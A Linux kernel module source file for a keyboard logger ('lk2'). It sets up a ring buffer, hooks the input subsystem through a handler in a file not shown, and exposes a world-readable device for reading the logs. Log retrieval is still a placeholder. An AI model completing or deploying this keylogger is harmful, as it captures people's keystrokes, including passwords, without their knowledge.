// SPDX-License-Identifier: GPL-2.0

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include "lk2.h"

// Global ring accessible from lk2_input.c
struct lk2_ring g_lk2_ring;

static int lk2_build_snapshot(char **out_buf, size_t *out_len)
{
	static const char placeholder[] =
		"No keylogs available (snapshot not implemented)\n";
	char *buf;

	if (!out_buf || !out_len)
		return -EINVAL;

	buf = kvmalloc(sizeof(placeholder), GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	memcpy(buf, placeholder, sizeof(placeholder));
	*out_buf = buf;
	*out_len = sizeof(placeholder) - 1;
	return 0;
}

// misc device file ops

static int keylogs_open(struct inode *inode, struct file *file)
{
	struct lk2_file_ctx *ctx;
	int err;

	ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
	if (!ctx)
		return -ENOMEM;

	err = lk2_build_snapshot(&ctx->buf, &ctx->len);
	if (err)
	{
		kfree(ctx);
		return err;
	}

	file->private_data = ctx;
	return 0;
}

static ssize_t keylogs_read(struct file *file, char __user *ubuf,
							size_t count, loff_t *ppos)
{
	struct lk2_file_ctx *ctx = file->private_data;

	if (!ctx || !ctx->buf)
		return 0;

	return simple_read_from_buffer(ubuf, count, ppos, ctx->buf, ctx->len);
}

static int keylogs_release(struct inode *inode, struct file *file)
{
	struct lk2_file_ctx *ctx = file->private_data;

	if (ctx)
	{
		kvfree(ctx->buf);
		kfree(ctx);
	}

	return 0;
}

static const struct file_operations keylogs_fops = {
	.owner = THIS_MODULE,
	.open = keylogs_open,
	.read = keylogs_read,
	.release = keylogs_release,
	.llseek = default_llseek,
};

static struct miscdevice keylogs_miscdev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = LK2_DEVICE_NAME,
	.fops = &keylogs_fops,
	.mode = 0444,
};

static int __init lk2_init(void)
{
	int err;

	lk2_ring_init(&g_lk2_ring);

	err = misc_register(&keylogs_miscdev);
	if (err)
	{
		pr_err("misc_register failed: %d\n", err);
		return err;
	}

	err = lk2_input_register();
	if (err)
	{
		pr_err("lk2: input handler registration failed: %d\n", err);
		misc_deregister(&keylogs_miscdev);
		return err;
	}

	pr_info("loaded. Read logs from /dev/%s\n", LK2_DEVICE_NAME);
	return 0;
}

static void __exit lk2_exit(void)
{
	lk2_input_unregister();
	misc_deregister(&keylogs_miscdev);

	pr_info("exiting\n");
}

module_init(lk2_init);
module_exit(lk2_exit);

MODULE_AUTHOR("sdummett <sdummett.dev@gmail.com>");
MODULE_DESCRIPTION("Keyboard logger using input subsystem + misc device");
MODULE_LICENSE("GPL");
